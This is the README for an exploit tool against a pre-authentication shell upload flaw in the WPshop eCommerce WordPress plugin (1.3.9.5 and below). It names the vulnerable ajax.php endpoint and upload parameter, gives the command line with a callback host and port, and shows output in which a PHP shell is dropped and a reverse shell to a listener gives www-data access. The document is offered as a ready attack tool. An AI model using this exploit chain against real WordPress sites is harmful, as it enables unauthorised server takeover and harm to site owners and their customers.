# Exploit for WordPress WPshop eCommerce 1.3.9.5 Shell Upload.
This is an exploit for a trivial shell upload vulnerability in the WPshop eCommerce plugin in versions 1.3.9.5 and below. Its a very trivial shell upload in "ajax.php", preauth, that 
we use to upload a shell and then spawn a reverse connect shell. Nothing fancy, only reason I bothered writing an exploit for it is because I didn't want to use Metasploit and happened 
to have use for it.


## Usage

To use, simply select which payload you want to use (currently only back_python.php is available, but I plan on adding back_php.php and back_perl.php at a later date). This is the 
"payload.php". You also must specify a callback host and port, along with the URL to the vulnerable Wordpress installation.

Example Use:
```
xrl:~$ python2 wpsh0pwn.py http://192.168.2.114/wordpress/ back_python.php 192.168.2.116 1337

██╗    ██╗██████╗ ███████╗██╗  ██╗ ██████╗ ██████╗ ██╗    ██╗███╗   ██╗
██║    ██║██╔══██╗██╔════╝██║  ██║██╔═████╗██╔══██╗██║    ██║████╗  ██║
██║ █╗ ██║██████╔╝███████╗███████║██║██╔██║██████╔╝██║ █╗ ██║██╔██╗ ██║
██║███╗██║██╔═══╝ ╚════██║██╔══██║████╔╝██║██╔═══╝ ██║███╗██║██║╚██╗██║
╚███╔███╔╝██║     ███████║██║  ██║╚██████╔╝██║     ╚███╔███╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
 Exploit for WPShop Ecommerce, WPVDB-7830 Version: 20150427.1
{+} Using target URL of: http://192.168.2.114/wordpress//wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload
{+} Our shell is at: http://192.168.2.114/wordpress/wp-content/uploads//test.php
{*} Sending Backconnect to 192.168.2.116:1337...
{*} Sending our payload...
{+} Using 192.168.2.116:1337 as callback...
{+} Dropping shell...
{+} Shell dropped... Triggering...
{+} got shell?
xrl:~$
```

Listener (I suggest using the [tcp-pty-shell-handler][shellhandle]:
```
$ python2 ./python-pty-shells/tcp_pty_shell_handler.py -b 0.0.0.0:1337
Got root yet?
Linux htp 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 (2015-03-02) x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@htp:/var/www/wordpress/wp-content/uploads$ ls
2015  test.php
www-data@htp:/var/www/wordpress/wp-content/uploads$ exit
exit
quitting, cleanup
```

## Demo
If you want, check out the [Asciicast demo][asciicast]. The ASCII art got a bit fucked this time around due to term resizing.
[![asciicast](https://asciinema.org/a/19262.png)](https://asciinema.org/a/19262)

## Licence
Licenced under the [WTFPL][wtfpl]

[asciicast]: https://asciinema.org/a/19262
[wtfpl]: http://www.wtfpl.net/
[shellhandle]: https://github.com/infodox/python-pty-shells
